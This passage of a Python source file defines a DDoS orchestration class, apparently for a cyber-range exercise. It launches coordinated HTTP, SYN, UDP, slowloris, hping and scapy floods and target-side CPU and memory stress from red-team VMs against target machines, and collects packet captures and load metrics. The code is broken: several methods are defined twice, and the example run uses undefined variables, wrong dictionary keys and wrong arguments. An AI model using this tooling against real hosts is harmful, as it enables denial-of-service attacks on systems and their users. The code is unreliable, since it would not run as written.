        logger.info(f"📡 Starting netstat (ss) capture on {target_vm} -> {remote_log} for port {target_port} (duration: {duration}s)")
        result = SSHExecutor.execute_command(target_vm, cmd, timeout=10)
        if result["success"]:
            return remote_log
        else:
            logger.error(f"Failed to start netstat capture on {target_vm}: {result['stderr']}")
            return None

    def fetch_remote_file(self, hostname: str, remote_path: str, dest_dir: str = "/tmp") -> Optional[str]:
        """
        Fetch a remote file to the local dest_dir by downloading via SFTP and writing locally with the same filename.
        Returns local path on success or None.
        """
        local_name = os.path.join(dest_dir, os.path.basename(remote_path))
        res = SSHExecutor.fetch_file(hostname, remote_path)
        if not res.get("success"):
            logger.error(f"Failed to download {remote_path} from {hostname}: {res.get('error')}")
            return None
        try:
            with open(local_name, "wb") as f:
                f.write(res["data"])
            logger.info(f"✅ Fetched {remote_path} from {hostname} to {local_name}")
            return local_name
        except Exception as e:
            logger.error(f"Failed to write local file {local_name}: {e}")
            return None

    def execute_distributed_attack(
        self,
        attack_type: str,
        target_team: str,
        target_port: int = 80,
        duration: int = 300,
        num_attackers: int = 3,
        capture_on_target: bool = True,
        background: bool = True,  # New parameter: run attacks in background by default
    ) -> List[str]:
        """
        Execute coordinated attack from multiple VMs
        """
        logger.info(f"🚀 Launching distributed {attack_type} attack on {target_team}")

        target_ip = self.blue_team_targets.get(target_team)
        if not target_ip:
            logger.error(f"❌ Unknown target: {target_team}")
            return []
        # Verify connectivity for target and attackers
        target_conn = SSHExecutor.check_connectivity(target_ip)
        if not target_conn.get("success"):
            logger.error(f"Target {target_ip} is not reachable: {target_conn.get('error')}")
            return []

        # Filter attacker VMs to ones we can reach
        reachable_attacker_ips = []
        for ip in self.red_team_vms.values():
            conn = SSHExecutor.check_connectivity(ip)
            if conn.get("success"):
                reachable_attacker_ips.append(ip)
            else:
                logger.warning(f"Attacker VM {ip} not reachable, skipping: {conn.get('error')}")
        if not reachable_attacker_ips:
            logger.error("No reachable attacker VMs. Aborting attack.")
            return []

        attacker_ips = reachable_attacker_ips

        # Optionally start captures on the target machine to verify the attack
        pcap_path = None
        netstat_log = None
        if capture_on_target:
            pcap_path = self.start_target_packet_capture(target_ip, target_port, duration + 5)
            netstat_log = self.start_target_netstat_capture(target_ip, target_port, duration + 5)
            # allow short warm-up time for tcpdump/ss loop
            time.sleep(1)

        # Special-case: attacks that run directly on the target VM (stress tests)
        if attack_type in ["target_stress_cpu", "target_stress_mem"]:
            logger.info(f"⚠️ Starting a target-local stress attack on {target_ip}: {attack_type}")
            if attack_type == "target_stress_cpu":
                attack_id = self.execute_target_cpu_stress(target_ip, workers=num_attackers, duration=duration, background=background)
            else:
                # default memory per attacker heuristic (e.g., 200MB per attacker)
                mem_mb = 200 * max(1, num_attackers)
                attack_id = self.execute_target_mem_stress(target_ip, mem_mb=mem_mb, duration=duration, background=background)

            logger.info(f"✅ Started target stress attack {attack_id} on {target_ip}")
            return [attack_id]

        # Select attacker VMs
        attacker_ips = list(self.red_team_vms.values())[:num_attackers]
        attack_ids = []

        # Launch attacks simultaneously from all VMs
        for attacker_ip in attacker_ips:
            try:
                if attack_type == "http_flood":
                    attack_id = self.execute_http_flood(attacker_ip, target_ip,
                                                       port=target_port, duration=duration, background=background)
                elif attack_type == "syn_flood":
                    attack_id = self.execute_syn_flood(attacker_ip, target_ip,
                                                      port=target_port, duration=duration, background=background)
                elif attack_type == "udp_flood":
                    attack_id = self.execute_udp_flood(attacker_ip, target_ip,
                                                      port=target_port, duration=duration, background=background)
                elif attack_type == "slowloris":
                    attack_id = self.execute_slowloris(attacker_ip, target_ip,
                                                      port=target_port, duration=duration, background=background)
                elif attack_type == "hping_heavy":
                    attack_id = self.execute_hping_heavy(attacker_ip, target_ip,
                                                        port=target_port, payload_size=1400, duration=duration, background=background)
                elif attack_type in ["scapy_syn", "scapy_udp", "scapy_icmp"]:
                    # Extract type from string (e.g., "scapy_syn" -> "syn")
                    scapy_type = attack_type.split("_")[1]
                    attack_id = self.execute_scapy_flood(
                        attacker_ip, target_ip, port=target_port, attack_type=scapy_type, duration=duration, background=background
                    )
                else:
                    logger.error(f"❌ Unknown attack type: {attack_type}")
                    continue
                # If tcpdump/netstat capture was started, attach their remote names to the result
                if pcap_path or netstat_log:
                    res = self.get_attack_status(attack_id)
                    if res:
                        # update internal AttackResult to include the remote paths (we will fetch them after attacks finish)
                        attack_obj = self.active_attacks.get(attack_id)
                        if attack_obj:
                            attack_obj.captured_pcap = pcap_path
                            attack_obj.captured_netstat_log = netstat_log

                attack_ids.append(attack_id)
                logger.info(f"✅ Started attack {attack_id} from {attacker_ip}")

            except Exception as e:
                logger.error(f"❌ Failed to launch attack from {attacker_ip}: {str(e)}")

        # After all attacks finished, fetch capture artifacts from the target (pcap, netstat) if available
        if capture_on_target and (pcap_path or netstat_log):
            local_pcap = None
            local_netstat = None
            if pcap_path:
                local_pcap = self.fetch_remote_file(target_ip, pcap_path, dest_dir="/tmp")
            if netstat_log:
                local_netstat = self.fetch_remote_file(target_ip, netstat_log, dest_dir="/tmp")

            # Attach local capture paths to each attack result for convenience
            for attack_id in attack_ids:
                attack = self.active_attacks.get(attack_id)
                if not attack:
                    continue
                if local_pcap:
                    attack.captured_pcap = local_pcap
                if local_netstat:
                    attack.captured_netstat_log = local_netstat

        return attack_ids

    def get_attack_status(self, attack_id: str) -> Optional[Dict[str, Any]]:
        """Get status of a specific attack"""
        attack = self.active_attacks.get(attack_id)
        if attack:
            return asdict(attack)
        return None

    def stop_attack(self, attack_id: str) -> bool:
        """
        Stop a running attack by killing the process on the remote VM
        """
        attack = self.active_attacks.get(attack_id)
        if not attack:
            logger.error(f"❌ Attack {attack_id} not found")
            return False

        if attack.status in ["completed", "failed", "stopped"]:
            logger.warning(f"⚠️ Attack {attack_id} already {attack.status}")
            return False

        logger.info(f"🛑 Stopping attack {attack_id} on {attack.attacker_vm}...")

        # Kill the process by name
        if attack.process_name:
            kill_command = f"sudo pkill -9 -f '{attack.process_name}'"
            result = SSHExecutor.execute_command(attack.attacker_vm, kill_command, timeout=10)

            if result["success"] or result["exit_code"] == 1:  # pkill returns 1 if no process found
                attack.status = "stopped"
                attack.end_time = datetime.now().isoformat()
                logger.info(f"✅ Attack {attack_id} stopped successfully")
                return True
            else:
                logger.error(f"❌ Failed to stop attack {attack_id}: {result['stderr']}")
                return False
        else:
            logger.error(f"❌ No process name tracked for attack {attack_id}")
            return False

    def stop_all_attacks(self) -> Dict[str, bool]:
        """
        Stop all running attacks
        """
        logger.info("🛑 Stopping all active attacks...")
        results = {}

        for attack_id, attack in self.active_attacks.items():
            if attack.status == "running":
                results[attack_id] = self.stop_attack(attack_id)

        return results

    def ensure_tcpdump_on_host(self, hostname: str) -> bool:
        """
        Ensure tcpdump is installed on the host; attempts to install via apt-get if not present.
        Returns True if tcpdump is present or successfully installed.
        """
        # Check if tcpdump exists
        check = SSHExecutor.execute_command(hostname, "which tcpdump || echo 'MISSING'", timeout=10)
        if check["success"] and "MISSING" not in check["stdout"]:
            logger.debug(f"tcpdump already present on {hostname}")
            return True
        # Attempt to install tcpdump
        logger.info(f"Installing tcpdump on {hostname}...")
        install_cmd = "sudo apt-get update -y && sudo apt-get install -y tcpdump"
        res = SSHExecutor.execute_command(hostname, install_cmd, timeout=120)
        if res["success"]:
            logger.info(f"tcpdump installed on {hostname}")
            return True
        logger.error(f"Failed to ensure tcpdump on {hostname}: {res.get('stderr')}")
        return False

    def export_results(self, output_file: str):
        """Export all attack results to JSON"""
        results = [asdict(attack) for attack in self.active_attacks.values()]

        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2)

        logger.info(f"📊 Exported {len(results)} attack results to {output_file}")

    def get_target_metrics(self, target_vm: str) -> Dict[str, Any]:
        """
        Collect CPU and memory metrics from target VM during stress operations
        """
        try:
            # Get CPU usage (1-second average)
            cpu_cmd = "top -bn1 | grep 'Cpu(s)' | awk '{print $2}' | sed 's/%us,//'"
            cpu_result = SSHExecutor.execute_command(target_vm, cpu_cmd, timeout=10)

            # Get memory usage
            mem_cmd = "free | grep Mem | awk '{printf \"%.2f\", $3/$2 * 100}'"
            mem_result = SSHExecutor.execute_command(target_vm, mem_cmd, timeout=10)

            # Get load average
            load_cmd = "uptime | awk -F'load average:' '{print $2}' | awk '{print $1}' | sed 's/,//'"
            load_result = SSHExecutor.execute_command(target_vm, load_cmd, timeout=10)

            metrics = {
                "timestamp": datetime.now().isoformat(),
                "target_vm": target_vm,
                "cpu_usage_percent": float(cpu_result["stdout"].strip()) if cpu_result["success"] and cpu_result["stdout"].strip() else 0.0,
                "memory_usage_percent": float(mem_result["stdout"].strip()) if mem_result["success"] and mem_result["stdout"].strip() else 0.0,
                "load_average_1min": float(load_result["stdout"].strip()) if load_result["success"] and load_result["stdout"].strip() else 0.0,
                "collection_success": cpu_result["success"] and mem_result["success"] and load_result["success"]
            }

            if metrics["collection_success"]:
                logger.info(f"📈 {target_vm} metrics: CPU={metrics['cpu_usage_percent']:.1f}%, MEM={metrics['memory_usage_percent']:.1f}%, Load={metrics['load_average_1min']:.2f}")
            else:
                logger.warning(f"⚠️ Failed to collect complete metrics from {target_vm}")

            return metrics

        except Exception as e:
            logger.error(f"❌ Error collecting metrics from {target_vm}: {e}")
            return {
                "timestamp": datetime.now().isoformat(),
                "target_vm": target_vm,
                "cpu_usage_percent": 0.0,
                "memory_usage_percent": 0.0,
                "load_average_1min": 0.0,
                "collection_success": False,
                "error": str(e)
            }

    def monitor_target_metrics(self, target_vm: str, duration: int = 300, interval: int = 10) -> List[Dict[str, Any]]:
        """
        Monitor target VM metrics over time during stress operations
        Returns list of metric snapshots
        """
        logger.info(f"📊 Starting metric monitoring on {target_vm} for {duration}s (interval: {interval}s)")
        metrics_history = []
        start_time = time.time()

        while time.time() - start_time < duration:
            metrics = self.get_target_metrics(target_vm)
            metrics_history.append(metrics)

            # Log high resource usage
            if metrics["collection_success"]:
                if metrics["cpu_usage_percent"] > 80:
                    logger.warning(f"🔥 HIGH CPU: {target_vm} at {metrics['cpu_usage_percent']:.1f}%")
                if metrics["memory_usage_percent"] > 80:
                    logger.warning(f"🔥 HIGH MEMORY: {target_vm} at {metrics['memory_usage_percent']:.1f}%")
                if metrics["load_average_1min"] > 4.0:
                    logger.warning(f"🔥 HIGH LOAD: {target_vm} load average {metrics['load_average_1min']:.2f}")

            time.sleep(interval)

        logger.info(f"📊 Metric monitoring complete for {target_vm}: {len(metrics_history)} samples")
        return metrics_history

    def export_metrics_report(self, metrics_history: List[Dict[str, Any]], output_file: str):
        """
        Export metrics monitoring data to JSON report
        """
        if not metrics_history:
            logger.warning("⚠️ No metrics data to export")
            return

        # Calculate summary statistics
        successful_metrics = [m for m in metrics_history if m.get("collection_success", False)]

        report = {
            "summary": {
                "target_vm": metrics_history[0].get("target_vm", "unknown"),
                "monitoring_start": metrics_history[0].get("timestamp"),
                "monitoring_end": metrics_history[-1].get("timestamp"),
                "total_samples": len(metrics_history),
                "successful_samples": len(successful_metrics)
            },
            "statistics": {},
            "raw_data": metrics_history
        }

        if successful_metrics:
            cpu_values = [m["cpu_usage_percent"] for m in successful_metrics]
            mem_values = [m["memory_usage_percent"] for m in successful_metrics]
            load_values = [m["load_average_1min"] for m in successful_metrics]

            report["statistics"] = {
                "cpu": {
                    "avg": sum(cpu_values) / len(cpu_values),
                    "min": min(cpu_values),
                    "max": max(cpu_values)
                },
                "memory": {
                    "avg": sum(mem_values) / len(mem_values),
                    "min": min(mem_values),
                    "max": max(mem_values)
                },
                "load": {
                    "avg": sum(load_values) / len(load_values),
                    "min": min(load_values),
                    "max": max(load_values)
                }
            }

            logger.info(f"📈 Metrics summary for {report['summary']['target_vm']}:")
            logger.info(f"   CPU: avg={report['statistics']['cpu']['avg']:.1f}% max={report['statistics']['cpu']['max']:.1f}%")
            logger.info(f"   Memory: avg={report['statistics']['memory']['avg']:.1f}% max={report['statistics']['memory']['max']:.1f}%")
            logger.info(f"   Load: avg={report['statistics']['load']['avg']:.2f} max={report['statistics']['load']['max']:.2f}")

        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)

        logger.info(f"📊 Metrics report exported to {output_file}")

    def get_target_metrics(self, target_vm: str) -> Dict[str, Any]:
        """
        Collect CPU and memory metrics from target VM during stress operations
        """
        try:
            # Get CPU usage (1-second average)
            cpu_cmd = "top -bn1 | grep 'Cpu(s)' | awk '{print $2}' | sed 's/%us,//'"
            cpu_result = SSHExecutor.execute_command(target_vm, cpu_cmd, timeout=10)

            # Get memory usage
            mem_cmd = "free | grep Mem | awk '{printf \"%.2f\", $3/$2 * 100}'"
            mem_result = SSHExecutor.execute_command(target_vm, mem_cmd, timeout=10)

            # Get load average
            load_cmd = "uptime | awk -F'load average:' '{print $2}' | awk '{print $1}' | sed 's/,//'"
            load_result = SSHExecutor.execute_command(target_vm, load_cmd, timeout=10)

            metrics = {
                "timestamp": datetime.now().isoformat(),
                "target_vm": target_vm,
                "cpu_usage_percent": float(cpu_result["stdout"].strip()) if cpu_result["success"] and cpu_result["stdout"].strip() else 0.0,
                "memory_usage_percent": float(mem_result["stdout"].strip()) if mem_result["success"] and mem_result["stdout"].strip() else 0.0,
                "load_average_1min": float(load_result["stdout"].strip()) if load_result["success"] and load_result["stdout"].strip() else 0.0,
                "collection_success": cpu_result["success"] and mem_result["success"] and load_result["success"]
            }

            if metrics["collection_success"]:
                logger.info(f"📈 {target_vm} metrics: CPU={metrics['cpu_usage_percent']:.1f}%, MEM={metrics['memory_usage_percent']:.1f}%, Load={metrics['load_average_1min']:.2f}")
            else:
                logger.warning(f"⚠️ Failed to collect complete metrics from {target_vm}")

            return metrics

        except Exception as e:
            logger.error(f"❌ Error collecting metrics from {target_vm}: {e}")
            return {
                "timestamp": datetime.now().isoformat(),
                "target_vm": target_vm,
                "cpu_usage_percent": 0.0,
                "memory_usage_percent": 0.0,
                "load_average_1min": 0.0,
                "collection_success": False,
                "error": str(e)
            }

    def monitor_target_metrics(self, target_vm: str, duration: int = 300, interval: int = 10) -> List[Dict[str, Any]]:
        """
        Monitor target VM metrics over time during stress operations
        Returns list of metric snapshots
        """
        logger.info(f"📊 Starting metric monitoring on {target_vm} for {duration}s (interval: {interval}s)")
        metrics_history = []
        start_time = time.time()

        while time.time() - start_time < duration:
            metrics = self.get_target_metrics(target_vm)
            metrics_history.append(metrics)

            # Log high resource usage
            if metrics["collection_success"]:
                if metrics["cpu_usage_percent"] > 80:
                    logger.warning(f"🔥 HIGH CPU: {target_vm} at {metrics['cpu_usage_percent']:.1f}%")
                if metrics["memory_usage_percent"] > 80:
                    logger.warning(f"🔥 HIGH MEMORY: {target_vm} at {metrics['memory_usage_percent']:.1f}%")
                if metrics["load_average_1min"] > 4.0:
                    logger.warning(f"🔥 HIGH LOAD: {target_vm} load average {metrics['load_average_1min']:.2f}")

            time.sleep(interval)

        logger.info(f"📊 Metric monitoring complete for {target_vm}: {len(metrics_history)} samples")
        return metrics_history

    def export_metrics_report(self, metrics_history: List[Dict[str, Any]], output_file: str):
        """
        Export metrics monitoring data to JSON report
        """
        if not metrics_history:
            logger.warning("⚠️ No metrics data to export")
            return

        # Calculate summary statistics
        successful_metrics = [m for m in metrics_history if m.get("collection_success", False)]

        report = {
            "summary": {
                "target_vm": metrics_history[0].get("target_vm", "unknown"),
                "monitoring_start": metrics_history[0].get("timestamp"),
                "monitoring_end": metrics_history[-1].get("timestamp"),
                "total_samples": len(metrics_history),
                "successful_samples": len(successful_metrics)
            },
            "statistics": {},
            "raw_data": metrics_history
        }

        if successful_metrics:
            cpu_values = [m["cpu_usage_percent"] for m in successful_metrics]
            mem_values = [m["memory_usage_percent"] for m in successful_metrics]
            load_values = [m["load_average_1min"] for m in successful_metrics]

            report["statistics"] = {
                "cpu": {
                    "avg": sum(cpu_values) / len(cpu_values),
                    "min": min(cpu_values),
                    "max": max(cpu_values)
                },
                "memory": {
                    "avg": sum(mem_values) / len(mem_values),
                    "min": min(mem_values),
                    "max": max(mem_values)
                },
                "load": {
                    "avg": sum(load_values) / len(load_values),
                    "min": min(load_values),
                    "max": max(load_values)
                }
            }

            logger.info(f"📈 Metrics summary for {report['summary']['target_vm']}:")
            logger.info(f"   CPU: avg={report['statistics']['cpu']['avg']:.1f}% max={report['statistics']['cpu']['max']:.1f}%")
            logger.info(f"   Memory: avg={report['statistics']['memory']['avg']:.1f}% max={report['statistics']['memory']['max']:.1f}%")
            logger.info(f"   Load: avg={report['statistics']['load']['avg']:.2f} max={report['statistics']['load']['max']:.2f}")

        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)

        logger.info(f"📊 Metrics report exported to {output_file}")


# Example usage
if __name__ == "__main__":
    orchestrator = DDoSOrchestrator()

    # Install tools on all Red Team VMs
    print("\n=== Installing DDoS Tools ===")
    for vm_name, vm_ip in orchestrator.red_team_vms.items():
        print(f"\n📦 Installing on {vm_name} ({vm_ip})...")
        result = orchestrator.install_ddos_tools(vm_ip)
        if result["success"]:
            print(f"✅ Installation successful on {vm_name}")
        else:
            print(f"❌ Installation failed on {vm_name}: {result['stderr']}")

    # Example: Execute distributed HTTP flood with metrics monitoring
    print("\n=== Executing Distributed HTTP Flood with Monitoring ===")
    attack_ids = orchestrator.execute_distributed_attack(
        attack_type="http_flood",
        target_team="team1",
        target_port=9080,  # DVWA port
        duration=300,  # 5 minutes - but we can stop it early
        num_attackers=2,  # Use 2 attackers
        capture_on_target=True,
        background=True  # Run in background so we can stop it
    )

    print(f"\n✅ Launched {len(attack_ids)} distributed attacks")
    for attack_id in attack_ids:
        print(f"   - Attack ID: {attack_id}")

    # Start monitoring target metrics
    target_ip = "20.10.40.11"  # Blue Team 1 (OPNsense LAN)
    print(f"\n📊 Starting metrics monitoring for target {target_ip}")
    monitoring_thread = threading.Thread(
        target=orchestrator.monitor_target_metrics,
        args=(target_ip, 5)  # Sample every 5 seconds
    )
    monitoring_thread.daemon = True
    monitoring_thread.start()

    # Let attacks run for a bit
    print("\n⏳ Attacks running... (will stop after 30 seconds for demo)")
    time.sleep(30)

    # Get final metrics
    print("\n📋 Collecting final target metrics...")
    final_metrics = orchestrator.get_target_metrics(target_ip)
    if final_metrics:
        print(f"   CPU Usage: {final_metrics['cpu_usage']}%")
        print(f"   Memory Usage: {final_metrics['memory_usage']}%")
        print(f"   Load Average: {final_metrics['load_average']}")

    # Export metrics report
    if hasattr(orchestrator, 'metrics_data') and orchestrator.metrics_data:
        report_path = f"/tmp/attack_metrics_{int(time.time())}.json"
        orchestrator.export_metrics_report(report_path)
        print(f"   Metrics report saved to: {report_path}")
    else:
        print("   No metrics data collected")

    # Stop all attacks
    print("\n🛑 Stopping all attacks...")
    stop_results = orchestrator.stop_all_attacks()
    for attack_id, success in stop_results.items():
        if success:
            print(f"   ✅ Stopped attack {attack_id}")
        else:
            print(f"   ❌ Failed to stop attack {attack_id}")

    # Check attack status
    print("\n=== Attack Results ===")
    for attack_id in attack_ids:
        status = orchestrator.get_attack_status(attack_id)
        if status:
            print(f"\n📊 Attack {attack_id}:")
            print(f"   Tool: {status['tool']}")
            print(f"   Target: {status['target_ip']}:{status['target_port']}")
            print(f"   Status: {status['status']}")
            print(f"   Started: {status['start_time']}")
            print(f"   Ended: {status['end_time']}")
            # Show capture artifacts if available
            if status.get('captured_pcap'):
                print(f"   Captured PCAP (local): {status.get('captured_pcap')}")
            if status.get('captured_netstat_log'):
                print(f"   Captured netstat log (local): {status.get('captured_netstat_log')}")

    # Export results
    output_file = f"/tmp/ddos_attack_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    orchestrator.export_results(output_file)
    print(f"\n💾 Results exported to: {output_file}")

    # Wait for metrics monitoring to complete and export metrics report
    print("\n📊 Waiting for metrics collection to complete...")
    monitor_thread.join()

    if metrics_data:
        metrics_file = f"/tmp/ddos_metrics_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        orchestrator.export_metrics_report(metrics_data, metrics_file)
        print(f"📈 Metrics report exported to: {metrics_file}")
    else:
        print("⚠️ No metrics data collected")
